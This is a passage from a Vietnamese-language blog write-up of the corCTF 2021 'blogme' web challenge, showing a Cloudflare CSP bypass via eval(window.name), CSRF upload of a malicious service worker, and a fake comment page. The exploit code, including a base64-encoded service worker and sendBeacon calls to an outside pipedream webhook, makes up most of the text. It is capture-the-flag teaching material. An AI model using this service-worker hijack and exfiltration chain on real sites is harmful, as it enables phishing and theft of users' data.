</pre></table></code></div></div><p>V√† ·ªü post th·ª© 3 c·ªßa admin c≈©ng c√≥ ƒë·ªÉ g·ª£i √Ω:</p><p>‚Äúwow, a lot of people have signed up and posted stuff! my bandwith was starting to get a little high, but Cloudflare (wink) (NOT SPONSORED) saved the day :D‚Äù</p><p>ƒê·ªÉ bypass th√¨ ta c√≥ th·ªÉ th·ª≠ tra ‚Äúcloudflare csp bypass unsafe-eval‚Äù, t√¨m ƒë∆∞·ª£c m·ªôt payload tr√™n <a href="https://twitter.com/kinugawamasato/status/1414648695904083988">tweet</a>. Theo ƒë√≥, m√¨nh nh·∫≠n ra ƒë·ªÉ √°p d·ª•ng c√°ch n√†y th√¨ trang web ph·∫£i n·∫±m tr√™n m·ªôt cloudfare domain, v√¨ m√¨nh kh√¥ng c√≥ ƒëi·ªÅu ki·ªán mua domain üòÖ n√™n ch·∫Øc ch·ªâ d·ª´ng l·∫°i ·ªü m·ª©c ph√¢n t√≠ch th√¥i.</p><p>post length b·ªã gi·ªõi h·∫°n ch·ªâ ƒë∆∞·ª£c max l√† 300 k√≠ t·ª± n√™n t√°c gi·∫£ ƒë√£ reconstruct l·∫°i payload:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">_cf_translation</span><span class="nt">&gt;&lt;img</span> <span class="na">id=</span><span class="s">lang-selector</span> <span class="na">name=</span><span class="s">blobs</span><span class="nt">&gt;&lt;output</span> <span class="na">id=</span><span class="s">locale</span><span class="nt">&gt;&lt;script&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;/output&gt;&lt;/form&gt;&lt;a</span> <span class="na">data-translate=</span><span class="s">value</span><span class="nt">&gt;&lt;/a&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/zepto.min.js</span><span class="nt">&gt;&lt;/script&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/cf.common.js</span><span class="nt">&gt;&lt;/script&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/cf.common.js</span><span class="nt">&gt;&lt;/script&gt;</span>
</pre></table></code></div></div><p>Nh·ªù v√†o <code class="language-plaintext highlighter-rouge">eval(name)</code> ta c√≥ th·ªÉ execute JS code ch√®n v√†o t·ª´ <code class="language-plaintext highlighter-rouge">window.name</code>.</p><p>ƒêo·∫°n code x·ª≠ l√≠ file upload th·ª±c hi·ªán filter v√† ch·ªâ nh·∫≠n image tr√™n server: <img data-src="/assets/img/SWandMITM/filterFileUpload.png" alt="filter upload file" data-proofer-ignore> <em>filter upload file</em></p><p>·ªû ƒë√¢y ta nh·∫≠n th·∫•y n·∫øu user l√† admin th√¨ s·∫Ω kh√¥ng c·∫ßn ph·∫£i check type c·ªßa file upload n√™n m·ª•c ƒë√≠ch l√† k·∫øt h·ª£p v·ªõi <code class="language-plaintext highlighter-rouge">csrf</code> ƒë·ªÉ upload file.</p><p>Admin bot c√≥ nhi·ªám v·ª• navigate t·ªõi <code class="language-plaintext highlighter-rouge">/api/comment</code> sau khi view post c·ªßa ta, g√µ flag v√†o √¥ comment v√† ·∫•n submit.</p><p>Sau khi th·ª≠ t·∫°o m·ªôt post v·ªõi n·ªôi dung l√† <code class="language-plaintext highlighter-rouge">corCTF{test_flag}</code> ƒë·ªÉ t·ª± test th√¨ m√¨nh nh·∫≠n ra n·ªôi dung ƒë√£ b·ªã thay ƒë·ªïi, ƒëo·∫°n code ƒë√≥ n·∫±m ·ªü: <img data-src="/assets/img/SWandMITM/replaceFlagComment.png" alt="replace flag comment" data-proofer-ignore> <em>replace flag comment</em></p><p>V·∫ßy l√† ta ph·∫£i nghƒ© ra m·ªôt c√°ch ƒë·ªÉ l·∫•y ƒë∆∞·ª£c n·ªôi dung c·ªßa comment m√† kh√¥ng b·ªã server thay ƒë·ªïi gi√° tr·ªã.</p><p>H∆∞·ªõng ƒëi c·ªßa t√°c gi·∫£ nh∆∞ sau: force admin bot upload m·ªôt <code class="language-plaintext highlighter-rouge">sw.js</code> file, file n√†y ta c√≥ th·ªÉ access t·ªõi b·∫±ng ƒë∆∞·ªùng d·∫´n <code class="language-plaintext highlighter-rouge">/api/file?id=&lt;file-id&gt;</code>. Comment page ·ªü ƒë∆∞·ªùng d·∫´n <code class="language-plaintext highlighter-rouge">/api/comment</code> c√πng v·ªõi file upload ƒë·ªÅu thu·ªôc c√πng th∆∞ m·ª•c <code class="language-plaintext highlighter-rouge">/api</code> n√™n service woker c√≥ th·ªÉ ho·∫°t ƒë·ªông tr√™n comment page.</p><p>T√°c gi·∫£ t·∫°o m·ªôt s·ª± ki·ªán <code class="language-plaintext highlighter-rouge">fetch</code> trong <code class="language-plaintext highlighter-rouge">sw.js</code> ƒë·ªÉ ngƒÉn kh√¥ng cho request ƒëi ƒë·∫øn server m√† t·ª± tr·∫£ v·ªÅ response nh·ªù v√†o SW. Response tr·∫£ v·ªÅ kh√¥ng ph·∫£i l√† <code class="language-plaintext highlighter-rouge">/api/comment</code> ban ƒë·∫ßu n·ªØa, m√† thay v√†o ƒë√≥ l√† m·ªôt page theo ki·ªÉu Phishing, khi admin bot g√µ comment v√† ·∫•n submit th√¨ n·ªôi dung c·ªßa comment s·∫Ω ƒë∆∞·ª£c g·ª≠i ƒë·∫øn webhook c·ªßa ta.</p><p>C√°c b∆∞·ªõc chu·∫©n b·ªã:</p><ul><li>M·ªôt post v·ªõi content: <code class="language-plaintext highlighter-rouge">&lt;meta http-equiv="refresh" content="0;url=https://exploitpage" /&gt;</code><li>M·ªôt post d√πng ƒë·ªÉ bypass CSP (t·∫°m g·ªçi id c·ªßa post n√†y l√† <code class="language-plaintext highlighter-rouge">EVAL_POSTID</code>) v·ªõi content:</ul><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">_cf_translation</span><span class="nt">&gt;&lt;img</span> <span class="na">id=</span><span class="s">lang-selector</span> <span class="na">name=</span><span class="s">blobs</span><span class="nt">&gt;&lt;output</span> <span class="na">id=</span><span class="s">locale</span><span class="nt">&gt;&lt;script&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;/output&gt;&lt;/form&gt;&lt;a</span> <span class="na">data-translate=</span><span class="s">value</span><span class="nt">&gt;&lt;/a&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/zepto.min.js</span><span class="nt">&gt;&lt;/script&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/cf.common.js</span><span class="nt">&gt;&lt;/script&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/cf.common.js</span><span class="nt">&gt;&lt;/script&gt;</span>
</pre></table></code></div></div><p>Khai th√°c:</p><ul><li>Stage 1: g·ª≠i admin m·ªôt url tr·ªè t·ªõi post ch·ª©a meta tag -&gt; redirect ƒë·∫øn exploit page, t·∫°i ƒë√¢y set <code class="language-plaintext highlighter-rouge">window.name</code> b·∫±ng payload d√πng ƒë·ªÉ upload <code class="language-plaintext highlighter-rouge">sw.js</code>, sau ƒë√≥ redirect v·ªÅ l·∫°i <code class="language-plaintext highlighter-rouge">https://blogme.be.ax/post/${EVAL_POSTID}</code> -&gt; l√∫c n√†y payload s·∫Ω ƒë∆∞·ª£c executed v√† g·ª≠i id c·ªßa file <code class="language-plaintext highlighter-rouge">sw.js</code> (<code class="language-plaintext highlighter-rouge">SW_FILEID</code>) ƒë√£ ƒë∆∞·ª£c upload ƒë·∫øn webhook.<li>Stage 2: register <code class="language-plaintext highlighter-rouge">sw.js</code> ƒë√£ upload <code class="language-plaintext highlighter-rouge">register('https://blogme.be.ax/api/file?id=${SW_FILEID}')</code></ul><h3 id="khai-th√°c"><span class="mr-2"><em>Khai th√°c</em></span><a href="#khai-th√°c" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Exploit code:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>

<span class="nt">&lt;body&gt;</span>
    <span class="c">&lt;!--
    make two pages, one with the meta tag, and the other with the form tag csp bypass
    set eval post id to the id of the meta tag
    at window.name at the bottom, run stage1 first.
    send the post that has the meta redirect to the admin
    this sends the file id of the service worker to a webhook, which you can then set as service worker file id.
    then, change it to run stage2
    your webhook should have the flag!
  --&gt;</span>
    <span class="c">&lt;!--
        &lt;meta http-equiv="refresh" content="0;url=https://THISHTMLFILE" /&gt;
    --&gt;</span>
    <span class="c">&lt;!--
&lt;form id=_cf_translation&gt;&lt;img id=lang-selector name=blobs&gt;&lt;output id=locale&gt;&lt;script&gt;eval(name)&lt;/script&gt;&lt;/output&gt;&lt;/form&gt;&lt;a data-translate=value&gt;&lt;/a&gt;&lt;script src=/cdn-cgi/scripts/zepto.min.js&gt;&lt;/script&gt;&lt;script src=/cdn-cgi/scripts/cf.common.js&gt;&lt;/script&gt;&lt;script src=/cdn-cgi/scripts/cf.common.js&gt;&lt;/script&gt;
--&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">const</span> <span class="nx">EVAL_POSTID</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">8d44702a-dc4b-43f4-8651-0a64bc88fb08</span><span class="dl">"</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">SW_FILEID</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">a944179f-b7eb-4297-a3e3-9548feff8918</span><span class="dl">"</span><span class="p">;</span>
        <span class="cm">/*
self.addEventListener('fetch', async (e) =&gt; {
    console.log(e);
    if(e.request.url.includes("/api/comment")) {
        e.respondWith(new Response(new Blob([`

&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;

&lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no"&gt;
    &lt;title&gt;blogme&lt;/title&gt;
    &lt;link rel="stylesheet" href="/assets/bootstrap/css/bootstrap.min.css"&gt;
    &lt;link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&amp;amp;display=swap"&gt;
    &lt;link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora"&gt;
    &lt;link rel="stylesheet" href="/assets/css/styles.css"&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;nav class="navbar navbar-dark navbar-expand-md textwhite bg-primary text-white navigation-clean"&gt;
        &lt;div class="container"&gt;
            &lt;a class="navbar-brand" href="/"&gt;blogme&lt;/a&gt;
            &lt;button data-bs-toggle="collapse" class="navbar-toggler" data-bs-target="#navcol"&gt;
                &lt;span class="visually-hidden"&gt;Toggle navigation&lt;/span&gt;
                &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;
            &lt;/button&gt;
            &lt;div class="collapse navbar-collapse" id="navcol"&gt;
                &lt;ul class="navbar-nav ms-auto"&gt;
                    &lt;li class="nav-item"&gt;&lt;a class="nav-link" href="/"&gt;Home&lt;/a&gt;&lt;/li&gt;
                    &lt;li class="nav-item"&gt;&lt;a class="nav-link" href="/profile"&gt;Profile&lt;/a&gt;&lt;/li&gt;
                    &lt;li class="nav-item"&gt;&lt;a class="nav-link" href="/posts"&gt;Your Posts&lt;/a&gt;&lt;/li&gt;
                    &lt;li class="nav-item"&gt;&lt;a class="nav-link" href="/api/logout"&gt;Logout&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/nav&gt;

    &lt;div class="container card bg-secondary mt-5 p-0"&gt;
        &lt;div class="card-header"&gt;&lt;h3 class="m-0"&gt;Comment&lt;/h3&gt;&lt;/div&gt;
        &lt;div class="card-body"&gt;
            &lt;div class="card-text"&gt;Enter your comment below:&lt;/div&gt;
            &lt;form method="POST" action="https://enx4khh4m6jy.x.pipedream.net/"&gt;
                &lt;input class="form-control" type="hidden" name="id" value="7213f554-2b98-422a-8416-7a45d6c716be"&gt;
                &lt;div class="input-group mt-3"&gt;
                    &lt;span class="input-group-text"&gt;Comment&lt;/span&gt;
                    &lt;textarea class="form-control" name="text" rows=3 maxlength=150&gt;&lt;/textarea&gt;
                &lt;/div&gt;
                &lt;input type="hidden" name="_csrf" value="QaJVpRex-Yx3UhVRDCHWKT8GgJwg8P9HkRAM"&gt;
                &lt;button class="btn btn-primary mt-3 float-end" type="submit"&gt;Comment&lt;/button&gt;
            &lt;/form&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    &lt;script src="/assets/bootstrap/js/bootstrap.min.js"&gt;&lt;/scr` + `ipt&gt;
    &lt;script src="/assets/js/jquery.min.js"&gt;&lt;/scr` + `ipt&gt;
    &lt;script src="/assets/js/script.js"&gt;&lt;/scr` + `ipt&gt;
&lt;/body&gt;
&lt;/html&gt;
        `], { type: 'text/html' })));
    }
    return;
});
        */</span>

        <span class="kd">let</span> <span class="nx">stage1</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">data:application/javascript;base64,c2VsZi5hZGRFdmVudExpc3RlbmVyKCdmZXRjaCcsIGFzeW5jIChlKSA9PiB7CiAgICBjb25zb2xlLmxvZyhlKTsKICAgIGlmKGUucmVxdWVzdC51cmwuaW5jbHVkZXMoIi9hcGkvY29tbWVudCIpKSB7CiAgICAgICAgZS5yZXNwb25kV2l0aChuZXcgUmVzcG9uc2UobmV3IEJsb2IoW2AKCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCBzaHJpbmstdG8tZml0PW5vIj4KICAgIDx0aXRsZT5ibG9nbWU8L3RpdGxlPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvYXNzZXRzL2Jvb3RzdHJhcC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUxhdG86d2dodEA0MDA7NzAwJmFtcDtkaXNwbGF5PXN3YXAiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9TG9yYSI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9hc3NldHMvY3NzL3N0eWxlcy5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZGFyayBuYXZiYXItZXhwYW5kLW1kIHRleHR3aGl0ZSBiZy1wcmltYXJ5IHRleHQtd2hpdGUgbmF2aWdhdGlvbi1jbGVhbiI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iLyI+YmxvZ21lPC9hPgogICAgICAgICAgICA8YnV0dG9uIGRhdGEtYnMtdG9nZ2xlPSJjb2xsYXBzZSIgY2xhc3M9Im5hdmJhci10b2dnbGVyIiBkYXRhLWJzLXRhcmdldD0iI25hdmNvbCI+CiAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0idmlzdWFsbHktaGlkZGVuIj5Ub2dnbGUgbmF2aWdhdGlvbjwvc3Bhbj4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJuYXZiYXItdG9nZ2xlci1pY29uIj48L3NwYW4+CiAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UiIGlkPSJuYXZjb2wiPgogICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJuYXZiYXItbmF2IG1zLWF1dG8iPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iLyI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL3Byb2ZpbGUiPlByb2ZpbGU8L2E+PC9saT4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj48YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ii9wb3N0cyI+WW91ciBQb3N0czwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL2FwaS9sb2dvdXQiPkxvZ291dDwvYT48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIgY2FyZCBiZy1zZWNvbmRhcnkgbXQtNSBwLTAiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48aDMgY2xhc3M9Im0tMCI+Q29tbWVudDwvaDM+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC10ZXh0Ij5FbnRlciB5b3VyIGNvbW1lbnQgYmVsb3c6PC9kaXY+CiAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSJodHRwczovL2VueDRraGg0bTZqeS54LnBpcGVkcmVhbS5uZXQvIj4KICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIiB0eXBlPSJoaWRkZW4iIG5hbWU9ImlkIiB2YWx1ZT0iNzIxM2Y1NTQtMmI5OC00MjJhLTg0MTYtN2E0NWQ2YzcxNmJlIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwIG10LTMiPgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC10ZXh0Ij5Db21tZW50PC9zcGFuPgogICAgICAgICAgICAgICAgICAgIDx0ZXh0YXJlYSBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJ0ZXh0IiByb3dzPTMgbWF4bGVuZ3RoPTE1MD48L3RleHRhcmVhPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJfY3NyZiIgdmFsdWU9IlFhSlZwUmV4LVl4M1VoVlJEQ0hXS1Q4R2dKd2c4UDlIa1JBTSI+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgbXQtMyBmbG9hdC1lbmQiIHR5cGU9InN1Ym1pdCI+Q29tbWVudDwvYnV0dG9uPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSIvYXNzZXRzL2Jvb3RzdHJhcC9qcy9ib290c3RyYXAubWluLmpzIj48L3NjcmAgKyBgaXB0PgogICAgPHNjcmlwdCBzcmM9Ii9hc3NldHMvanMvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JgICsgYGlwdD4KICAgIDxzY3JpcHQgc3JjPSIvYXNzZXRzL2pzL3NjcmlwdC5qcyI+PC9zY3JgICsgYGlwdD4KPC9ib2R5Pgo8L2h0bWw+CiAgICAgICAgYF0sIHsgdHlwZTogJ3RleHQvaHRtbCcgfSkpKTsKICAgIH0KICAgIHJldHVybjsKfSk7</span><span class="dl">"</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">blob</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="k">async</span> <span class="nx">b</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">();</span>
                <span class="nx">formData</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="dl">"</span><span class="s2">sw.js</span><span class="dl">"</span><span class="p">);</span>

                <span class="kd">let</span> <span class="nx">pfp</span> <span class="o">=</span> <span class="k">await</span> <span class="p">(</span><span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/profile</span><span class="dl">"</span><span class="p">)).</span><span class="nx">text</span><span class="p">();</span>
                <span class="kd">let</span> <span class="nx">csrf</span> <span class="o">=</span> <span class="sr">/</span><span class="se">\?</span><span class="sr">_csrf=</span><span class="se">(</span><span class="sr">.*</span><span class="se">?)</span><span class="sr">"/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">pfp</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>

                <span class="kd">let</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/upload/?_csrf=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">csrf</span><span class="p">),</span> <span class="p">{</span>
                    <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">body</span><span class="p">:</span> <span class="nx">formData</span>
                <span class="p">});</span>
                <span class="nb">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://enx4khh4m6jy.x.pipedream.net/</span><span class="dl">"</span><span class="p">,</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">url</span><span class="p">).</span><span class="nx">search</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">));</span>
            <span class="p">});</span>
        <span class="p">};</span>

        <span class="kd">let</span> <span class="nx">stage2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">SW_FILEID</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nb">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="s2">`https://blogme.be.ax/api/file?id=</span><span class="p">${</span><span class="nx">SW_FILEID</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="p">{</span>
                <span class="na">scope</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/api/comment</span><span class="dl">'</span>
            <span class="p">});</span>
        <span class="p">};</span>

        <span class="nb">window</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">(</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">stage1</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s2">`)("</span><span class="p">${</span><span class="nx">SW_FILEID</span><span class="p">}</span><span class="s2">");`</span><span class="p">;</span>
        <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`https://blogme.be.ax/post/</span><span class="p">${</span><span class="nx">EVAL_POSTID</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>

<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><hr /><h2 id="t√†i-li·ªáu-tham-kh·∫£o"><span class="mr-2">T√†i li·ªáu tham kh·∫£o</span><a href="#t√†i-li·ªáu-tham-kh·∫£o" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://www.akamai.com/blog/security/abusing-the-service-workers-api">https://www.akamai.com/blog/security/abusing-the-service-workers-api</a></p><p><a href="https://betterprogramming.pub/man-in-the-middle-attacks-via-javascript-service-workers-52647ac929a2">https://betterprogramming.pub/man-in-the-middle-attacks-via-javascript-service-workers-52647ac929a2</a></p><p><a href="https://brycec.me/posts/corctf_2021_challenges#blogme">https://brycec.me/posts/corctf_2021_challenges#blogme</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/websec/'>WebSec</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/xss/" class="post-tag no-text-decoration" >xss</a> <a href="/tags/service-worker/" class="post-tag no-text-decoration" >service worker</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Service worker v√† Man-in-the-Middle Attack - to^&amp;url=https://to016.github.io//posts/SWandMITM/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Service worker v√† Man-in-the-Middle Attack - to^&amp;u=https://to016.github.io//posts/SWandMITM/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://to016.github.io//posts/SWandMITM/&amp;text=Service worker v√† Man-in-the-Middle Attack - to^" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PHPLFI2RCE/">C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE</a><li><a href="/posts/angstromctf2022/">AngstromCTF 2022</a><li><a href="/posts/SWandMITM/">Service worker v√† Man-in-the-Middle Attack</a><li><a href="/posts/noted/">Noted - picoCTF2022</a><li><a href="/posts/31linephp/">31 Line PHP - SPbCTF2021</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 